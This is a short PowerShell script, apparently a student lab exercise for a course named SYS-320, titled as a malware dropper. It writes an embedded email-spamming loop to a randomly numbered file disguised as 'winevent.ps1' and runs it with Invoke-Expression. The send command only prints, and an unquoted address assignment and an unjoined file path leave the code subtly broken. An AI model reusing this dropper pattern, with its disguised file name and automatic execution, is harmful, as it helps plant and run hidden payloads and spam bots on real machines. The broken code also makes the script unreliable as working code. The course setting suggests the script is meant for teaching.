<# Dropper for malware #>

$writesbBot = @'
# Send an email using Powershell

$toSend = ('michael.portegello@mymail.champlain.edu','')

# Message body
$msg = "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et
 dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea
 commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla
 pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est
 laborum."

while($true) {
    foreach ($email in $toSend) {
        # Address
        $email = michael.portegello@mymail.champlain.edu
        # Send
        write-host "Send-MailMessage -from 'michael.portegello@mymail.champlain.edu' -To
        $email -Subject 'Tisk Tisk' -Body $msg -SmtpServer X.X.X.X"

        # Pause
        start-sleep 1
    }
}
'@

# Directory to write
$sbDir = 'C:\Users\michael\SYS-320'

# Random number to add file
$sbRand = Get-random -Minimum 1000 -Maximum 1999

$sbRand

# Create and save
# C:\Users\michael\SYS-320
$file = $sbDir + $sbRand + "winevent.ps1"

# Write to a file
$writesbBot | out-file -FilePath $file

# Execute
Invoke-Expression $file
